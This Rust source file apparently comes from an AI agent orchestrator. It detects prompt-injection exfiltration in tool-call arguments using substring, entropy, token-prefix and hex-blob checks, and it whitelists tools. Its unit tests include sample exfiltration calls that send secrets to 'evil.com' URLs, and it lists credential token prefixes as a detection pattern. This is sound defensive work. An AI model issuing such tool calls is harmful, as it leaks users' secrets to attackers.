//! Security and exfiltration detection for the orchestrator.
//!
//! Multi-layer detection: substring matching, entropy analysis, token patterns,
//! and hex blob detection. Used to prevent prompt-injection data exfiltration.

use async_openai::types::chat::ChatCompletionMessageToolCall;

use crate::models::SkillCapability;

/// Minimum length of a substring to consider it a potential exfiltration payload.
/// Short strings (< 16 chars) produce too many false positives.
const EXFIL_MIN_FRAGMENT_LEN: usize = 16;

/// Shannon entropy threshold for detecting encoded/encrypted data in URL parameters.
/// Normal text (English): ~3.5-4.5 bits/char. Base64/hex encoded data: ~4.5-6.0.
/// Threshold of 4.5 balances false positives vs detection rate.
pub(crate) const ENTROPY_THRESHOLD: f64 = 4.5;

/// Maximum bytes of tool args to scan for exfiltration (prevents expensive scans
/// on very large payloads).
const EXFIL_SCAN_LIMIT: usize = 2048;

/// Maximum previous-result bytes to scan for exfiltration fragments.
/// Larger values catch data embedded deeper in results but cost O(n) per call.
const EXFIL_PREV_SCAN_LEN: usize = 1024;

/// Exfiltration sliding-window step size. Smaller = fewer blind spots but slower.
/// With a 128-byte window, step=16 provides high detection probability
/// at ~16x less cost than step=1. Steals >= 144 bytes are guaranteed detected.
const EXFIL_STEP: usize = 16;

/// Maximum number of previous results to scan. Prevents quadratic blowup
/// when many tools have been called in a single ReAct loop.
const EXFIL_MAX_PREV_RESULTS: usize = 10;

/// Common API token prefixes that should never appear in outbound tool args.
const TOKEN_PATTERNS: &[&str] = &[
    "sk-", "sk_live_", "sk_test_", // OpenAI / Stripe
    "ghp_", "gho_", "ghs_", "ghu_",  // GitHub
    "ya29.", // Google OAuth
    "xoxb-", "xoxp-", "xoxs-", // Slack
    "AKIA",  // AWS
    "eyJ",   // JWT (base64 of {"...)
];

/// Compute Shannon entropy (bits per character) of a byte string.
/// Higher entropy indicates more randomness — typical of encoded/encrypted data.
#[doc(hidden)]
pub fn shannon_entropy(data: &str) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &b in data.as_bytes() {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

pub(crate) fn contains_known_token_pattern(s: &str) -> bool {
    TOKEN_PATTERNS.iter().any(|p| s.contains(p))
}

/// Detect hex-encoded blobs (≥32 hex chars = 16+ bytes of data).
/// Hex has low Shannon entropy (~3.6) so it bypasses the entropy check.
pub(crate) fn contains_hex_blob(s: &str) -> bool {
    let mut hex_run = 0usize;
    for c in s.chars() {
        if c.is_ascii_hexdigit() {
            hex_run += 1;
            if hex_run >= 32 {
                return true;
            }
        } else {
            hex_run = 0;
        }
    }
    false
}

/// Recursively extract all string values from a JSON value.
fn extract_all_strings<'a>(value: &'a serde_json::Value, out: &mut Vec<&'a str>) {
    match value {
        serde_json::Value::String(s) => out.push(s.as_str()),
        serde_json::Value::Array(arr) => {
            for item in arr {
                extract_all_strings(item, out);
            }
        }
        serde_json::Value::Object(map) => {
            for (_, v) in map {
                extract_all_strings(v, out);
            }
        }
        _ => {}
    }
}

/// Check if a tool call payload might be exfiltrating data from a previous
/// tool result. Returns true if suspicious exfiltration is detected.
///
/// Two-layer detection:
/// 1. **Substring matching**: fragments from previous results appearing in new args
/// 2. **Entropy analysis**: high-entropy values in URL parameters (Base64/hex encoded leaks)
///
/// Both layers only scan the first EXFIL_SCAN_LIMIT bytes to bound cost.
/// Read-only tools (is_read_only=true in manifest) are exempt — they fetch data in, not out.
#[doc(hidden)]
pub fn detect_exfiltration(
    _tool_name: &str,
    previous_results: &[String],
    new_args: &str,
    is_read_only: bool,
) -> bool {
    // Read-only tools fetch data in; they don't send previous results outward.
    if is_read_only {
        return false;
    }

    let scan_args = if new_args.len() > EXFIL_SCAN_LIMIT {
        &new_args[..new_args.floor_char_boundary(EXFIL_SCAN_LIMIT)]
    } else {
        new_args
    };

    // Layer 1: Substring fragment matching.
    // Scan only the most recent results to bound cost (newest = most likely exfil target).
    let results_to_scan = if previous_results.len() > EXFIL_MAX_PREV_RESULTS {
        &previous_results[previous_results.len() - EXFIL_MAX_PREV_RESULTS..]
    } else {
        previous_results
    };
    for prev in results_to_scan {
        if prev.len() < EXFIL_MIN_FRAGMENT_LEN {
            continue;
        }
        let check_len = std::cmp::min(prev.len(), EXFIL_PREV_SCAN_LEN);
        for raw_start in (0..check_len.saturating_sub(EXFIL_MIN_FRAGMENT_LEN)).step_by(EXFIL_STEP) {
            let start = prev.floor_char_boundary(raw_start);
            let end = prev.floor_char_boundary(std::cmp::min(start + 128, check_len));
            if end <= start {
                continue;
            }
            let fragment = &prev[start..end];
            if fragment.len() >= EXFIL_MIN_FRAGMENT_LEN && scan_args.contains(fragment) {
                return true;
            }
        }
    }

    // Layer 2-4: Entropy, token pattern, and hex blob detection.
    // Only triggered if there are previous results to protect.
    if !previous_results.is_empty() {
        // Collect string values to scan: recursively extract all string
        // values from JSON if parseable, otherwise scan the raw args string.
        let mut values_to_scan: Vec<&str> = Vec::new();
        let parsed = serde_json::from_str::<serde_json::Value>(scan_args).ok();
        if let Some(ref val) = parsed {
            extract_all_strings(val, &mut values_to_scan);
        }
        if values_to_scan.is_empty() {
            // Non-JSON args or JSON with no string values: scan raw string
            values_to_scan.push(scan_args);
        }

        for s in values_to_scan {
            // Layer 2: High-entropy strings (potential Base64-encoded secrets)
            if s.len() >= 32 {
                let entropy = shannon_entropy(s);
                if entropy > ENTROPY_THRESHOLD {
                    return true;
                }
            }

            // Layer 3: Known API token pattern detection
            if s.len() >= EXFIL_MIN_FRAGMENT_LEN && contains_known_token_pattern(s) {
                return true;
            }

            // Layer 4: Hex-encoded blob detection (bypasses entropy check)
            if contains_hex_blob(s) {
                return true;
            }
        }
    }

    false
}

/// Check if a tool call is allowed by the loaded skill whitelist.
/// This is the core of the permission-inversion security model.
///
/// Returns `Ok(())` if the tool is registered, `Err(blocked_reason)` otherwise.
pub fn check_tool_permission(
    tool_calls: &[ChatCompletionMessageToolCall],
    registered_skills: &[&SkillCapability],
) -> Vec<ToolPermissionResult> {
    tool_calls
        .iter()
        .map(|tc| {
            let name = &tc.function.name;
            let is_registered = registered_skills.iter().any(|s| s.skill_name == *name);
            if is_registered {
                ToolPermissionResult::Allowed(name.clone())
            } else {
                ToolPermissionResult::Blocked(name.clone())
            }
        })
        .collect()
}

#[derive(Debug, Clone, PartialEq)]
pub enum ToolPermissionResult {
    Allowed(String),
    Blocked(String),
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── shannon_entropy ─────────────────────────────────────────────────

    #[test]
    fn shannon_entropy_empty_string_is_zero() {
        assert_eq!(shannon_entropy(""), 0.0);
    }

    #[test]
    fn shannon_entropy_single_repeated_char_is_zero() {
        // All same characters → zero entropy
        assert_eq!(shannon_entropy("aaaaaaaaaa"), 0.0);
    }

    #[test]
    fn shannon_entropy_two_equally_distributed_chars() {
        // "abababab" → 2 chars, equal frequency → 1.0 bit
        let e = shannon_entropy("abababab");
        assert!((e - 1.0).abs() < 0.001, "Expected ~1.0 bit, got {e}");
    }

    #[test]
    fn shannon_entropy_normal_english_text() {
        let text = "The quick brown fox jumps over the lazy dog";
        let e = shannon_entropy(text);
        // English text typically has entropy ~3.5-4.5 bits/char
        assert!(
            e > 3.0 && e < 5.0,
            "Expected English text entropy 3.0-5.0, got {e}"
        );
    }

    #[test]
    fn shannon_entropy_high_for_random_looking_data() {
        // Base64-like string with many distinct characters
        let data = "aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4yZ5";
        let e = shannon_entropy(data);
        assert!(
            e > ENTROPY_THRESHOLD,
            "Expected high entropy > {ENTROPY_THRESHOLD}, got {e}"
        );
    }

    #[test]
    fn shannon_entropy_is_nonnegative() {
        for input in &["", "a", "ab", "hello world", "1234567890abcdef"] {
            let e = shannon_entropy(input);
            assert!(
                e >= 0.0,
                "Entropy must be non-negative, got {e} for '{input}'"
            );
        }
    }

    // ── contains_known_token_pattern ────────────────────────────────────

    #[test]
    fn detects_openai_token_prefix() {
        assert!(contains_known_token_pattern("sk-abc123def456"));
    }

    #[test]
    fn detects_stripe_live_key() {
        assert!(contains_known_token_pattern("sk_live_abc123"));
    }

    #[test]
    fn detects_stripe_test_key() {
        assert!(contains_known_token_pattern("sk_test_abc123"));
    }

    #[test]
    fn detects_github_token_prefixes() {
        assert!(contains_known_token_pattern("ghp_abcdefghij1234567890"));
        assert!(contains_known_token_pattern("gho_abcdefghij1234567890"));
        assert!(contains_known_token_pattern("ghs_abcdefghij1234567890"));
        assert!(contains_known_token_pattern("ghu_abcdefghij1234567890"));
    }

    #[test]
    fn detects_google_oauth_token() {
        assert!(contains_known_token_pattern("ya29.a0AfH6SMBx_example"));
    }

    #[test]
    fn detects_slack_tokens() {
        assert!(contains_known_token_pattern("xoxb-123-456-abc"));
        assert!(contains_known_token_pattern("xoxp-123-456-abc"));
        assert!(contains_known_token_pattern("xoxs-123-456-abc"));
    }

    #[test]
    fn detects_aws_access_key() {
        assert!(contains_known_token_pattern("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn detects_jwt_prefix() {
        assert!(contains_known_token_pattern(
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
        ));
    }

    #[test]
    fn rejects_normal_text() {
        assert!(!contains_known_token_pattern("hello world"));
        assert!(!contains_known_token_pattern("just a normal url parameter"));
        assert!(!contains_known_token_pattern(""));
    }

    #[test]
    fn detects_token_embedded_in_larger_string() {
        assert!(contains_known_token_pattern(
            "Authorization: Bearer sk-abc123def456ghi789"
        ));
    }

    // ── contains_hex_blob ───────────────────────────────────────────────

    #[test]
    fn detects_32_char_hex_blob() {
        // Exactly 32 hex chars (16 bytes)
        assert!(contains_hex_blob("0123456789abcdef0123456789abcdef"));
    }

    #[test]
    fn detects_hex_blob_embedded_in_text() {
        let s = "data=0123456789abcdef0123456789abcdef&other=value";
        assert!(contains_hex_blob(s));
    }

    #[test]
    fn rejects_short_hex_runs() {
        // 31 hex chars (just under threshold)
        assert!(!contains_hex_blob("0123456789abcdef0123456789abcde"));
    }

    #[test]
    fn rejects_hex_interrupted_by_non_hex() {
        // Two 16-char hex runs separated by non-hex
        assert!(!contains_hex_blob("0123456789abcdef_0123456789abcdef"));
    }

    #[test]
    fn rejects_normal_text_as_hex() {
        assert!(!contains_hex_blob("hello world this is normal text"));
        assert!(!contains_hex_blob(""));
    }

    #[test]
    fn detects_uppercase_hex_blob() {
        assert!(contains_hex_blob("0123456789ABCDEF0123456789ABCDEF"));
    }

    #[test]
    fn detects_mixed_case_hex_blob() {
        assert!(contains_hex_blob("0123456789AbCdEf0123456789aBcDeF"));
    }

    // ── detect_exfiltration ─────────────────────────────────────────────

    #[test]
    fn read_only_tool_is_always_exempt() {
        let prev = vec!["secret_api_key_value_that_is_long_enough".to_string()];
        let args = r#"{"url": "https://evil.com?data=secret_api_key_value_that_is_long_enough"}"#;
        assert!(!detect_exfiltration("fetch", &prev, args, true));
    }

    #[test]
    fn detects_substring_exfiltration() {
        let prev =
            vec!["This is a secret value that should not leak to external services".to_string()];
        let args =
            r#"{"body": "This is a secret value that should not leak to external services"}"#;
        assert!(detect_exfiltration("send_email", &prev, args, false));
    }

    #[test]
    fn no_false_positive_on_unrelated_args() {
        let prev = vec!["Previous tool returned some data about weather forecasts".to_string()];
        let args = r#"{"query": "What is the capital of France?"}"#;
        assert!(!detect_exfiltration("search", &prev, args, false));
    }

    #[test]
    fn detects_high_entropy_string_in_args() {
        let prev = vec!["some previous result".to_string()];
        // A high-entropy base64-like string (potential encoded secret)
        let args = r#"{"token": "aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4yZ5aB3cD4eF5gH6"}"#; // gitleaks:allow
        assert!(detect_exfiltration("webhook", &prev, args, false));
    }

    #[test]
    fn detects_token_pattern_in_args() {
        let prev = vec!["some context data".to_string()];
        let args = r#"{"auth": "sk-abc123def456ghi789jkl012mno345"}"#; // gitleaks:allow
        assert!(detect_exfiltration("http_post", &prev, args, false));
    }

    #[test]
    fn detects_hex_blob_in_args() {
        let prev = vec!["some previous data here".to_string()];
        let args = r#"{"data": "0123456789abcdef0123456789abcdef"}"#;
        assert!(detect_exfiltration("send", &prev, args, false));
    }

    #[test]
    fn no_entropy_check_without_previous_results() {
        let prev: Vec<String> = vec![];
        // High entropy args but no previous results to protect
        let args = r#"{"token": "aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4yZ5aB3cD4eF5gH6"}"#; // gitleaks:allow
        assert!(!detect_exfiltration("webhook", &prev, args, false));
    }

    #[test]
    fn handles_non_json_args() {
        let prev = vec!["previous secret data that is long enough to detect".to_string()];
        let args = "previous secret data that is long enough to detect";
        assert!(detect_exfiltration("tool", &prev, args, false));
    }

    #[test]
    fn skips_short_previous_results() {
        let prev = vec!["short".to_string()]; // < EXFIL_MIN_FRAGMENT_LEN
        let args = r#"{"data": "short"}"#;
        // "short" is below min fragment length, so no substring match
        assert!(!detect_exfiltration("tool", &prev, args, false));
    }

    #[test]
    fn detects_long_secret_spanning_old_window() {
        // Regression: a 128-char secret must be detected even though it's
        // longer than the old 64-char fragment window.
        let secret = "sk-live-".to_string() + &"A".repeat(120); // 128 chars total
        let prev = vec![format!("API response: {secret}")];
        let args = format!(r#"{{"url": "https://evil.com/?key={secret}"}}"#);
        assert!(
            detect_exfiltration("http_api", &prev, &args, false),
            "must detect 128-char secret exfiltration"
        );
    }

    #[test]
    fn detects_100_char_substring_from_long_result() {
        // A 100-char substring from a longer result must be detected.
        let long_result = "X".repeat(200);
        let stolen_chunk = &long_result[50..150]; // 100 chars in the middle
        let prev = vec![long_result.clone()];
        let args = format!(r#"{{"data": "{stolen_chunk}"}}"#);
        assert!(
            detect_exfiltration("send", &prev, &args, false),
            "must detect 100-char substring exfiltration"
        );
    }

    #[test]
    fn step_size_detects_large_exfiltration() {
        // With EXFIL_STEP=16 and window=128, steals >= 144 bytes are guaranteed
        // detected because at least one step-aligned window falls entirely within
        // the stolen block. Test with a 200-byte steal from mid-result.
        let prefix = "P".repeat(17);
        let secret = "S".repeat(200);
        let suffix = "P".repeat(100);
        let result = format!("{prefix}{secret}{suffix}");
        let prev = vec![result];
        let args = format!(r#"{{"data": "{secret}"}}"#);
        assert!(
            detect_exfiltration("send", &prev, &args, false),
            "must detect 200-byte exfiltration even with step>1"
        );
    }

    #[test]
    fn scan_limits_to_recent_results() {
        // With EXFIL_MAX_PREV_RESULTS=10, the 11th-oldest result should NOT be scanned.
        // But we can verify the function doesn't panic with many results.
        let old_secret = "Z".repeat(128);
        let mut prev = vec![format!("old result with {old_secret}")];
        // Add 15 more innocuous results to push the old one out of the scan window
        for i in 0..15 {
            prev.push(format!("boring result {i}"));
        }
        let _args = format!(r#"{{"data": "{old_secret}"}}"#);
        // The old secret is at index 0, scan window is the last 10 (indices 6-15).
        // So it should NOT be detected via substring matching.
        // Note: it might still be detected via entropy (Layer 2), so use a low-entropy string.
        let low_entropy = "abcdefghijklmnop".repeat(8); // 128 chars, low entropy
        let mut prev2 = vec![format!("old: {low_entropy}")];
        for i in 0..15 {
            prev2.push(format!("boring result {i}"));
        }
        let args2 = format!(r#"{{"data": "{low_entropy}"}}"#);
        assert!(
            !detect_exfiltration("send", &prev2, &args2, false),
            "old result beyond scan window should not trigger substring detection"
        );
    }

    // ── check_tool_permission ───────────────────────────────────────────

    fn make_tool_call(name: &str) -> ChatCompletionMessageToolCall {
        ChatCompletionMessageToolCall {
            id: "call_1".into(),
            function: async_openai::types::chat::FunctionCall {
                name: name.into(),
                arguments: "{}".into(),
            },
        }
    }

    fn make_skill(name: &str) -> SkillCapability {
        // Construct via serde to pick up all #[serde(default)] fields automatically,
        // only specifying the required fields explicitly.
        let json = serde_json::json!({
            "skill_name": name,
            "max_memory_mb": 2,
            "allowed_domains": [],
            "allowed_fs_paths": [],
            "description": "test skill",
            "payload_schema": {},
        });
        serde_json::from_value(json).expect("SkillCapability test construction")
    }

    #[test]
    fn allows_registered_tool() {
        let calls = vec![make_tool_call("weather")];
        let skill = make_skill("weather");
        let skills: Vec<&SkillCapability> = vec![&skill];

        let results = check_tool_permission(&calls, &skills);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0], ToolPermissionResult::Allowed("weather".into()));
    }

    #[test]
    fn blocks_unregistered_tool() {
        let calls = vec![make_tool_call("malicious_skill")];
        let skill = make_skill("weather");
        let skills: Vec<&SkillCapability> = vec![&skill];

        let results = check_tool_permission(&calls, &skills);
        assert_eq!(results.len(), 1);
        assert_eq!(
            results[0],
            ToolPermissionResult::Blocked("malicious_skill".into())
        );
    }

    #[test]
    fn mixed_allowed_and_blocked() {
        let calls = vec![
            make_tool_call("weather"),
            make_tool_call("evil_tool"),
            make_tool_call("stocks"),
        ];
        let s1 = make_skill("weather");
        let s2 = make_skill("stocks");
        let skills: Vec<&SkillCapability> = vec![&s1, &s2];

        let results = check_tool_permission(&calls, &skills);
        assert_eq!(results.len(), 3);
        assert_eq!(results[0], ToolPermissionResult::Allowed("weather".into()));
        assert_eq!(
            results[1],
            ToolPermissionResult::Blocked("evil_tool".into())
        );
        assert_eq!(results[2], ToolPermissionResult::Allowed("stocks".into()));
    }

    #[test]
    fn empty_tool_calls_returns_empty() {
        let calls: Vec<ChatCompletionMessageToolCall> = vec![];
        let skill = make_skill("weather");
        let skills: Vec<&SkillCapability> = vec![&skill];

        let results = check_tool_permission(&calls, &skills);
        assert!(results.is_empty());
    }

    #[test]
    fn no_registered_skills_blocks_everything() {
        let calls = vec![make_tool_call("weather")];
        let skills: Vec<&SkillCapability> = vec![];

        let results = check_tool_permission(&calls, &skills);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0], ToolPermissionResult::Blocked("weather".into()));
    }

    // ── ToolPermissionResult equality ───────────────────────────────────

    #[test]
    fn tool_permission_result_equality() {
        assert_eq!(
            ToolPermissionResult::Allowed("a".into()),
            ToolPermissionResult::Allowed("a".into())
        );
        assert_ne!(
            ToolPermissionResult::Allowed("a".into()),
            ToolPermissionResult::Blocked("a".into())
        );
        assert_ne!(
            ToolPermissionResult::Allowed("a".into()),
            ToolPermissionResult::Allowed("b".into())
        );
    }
}
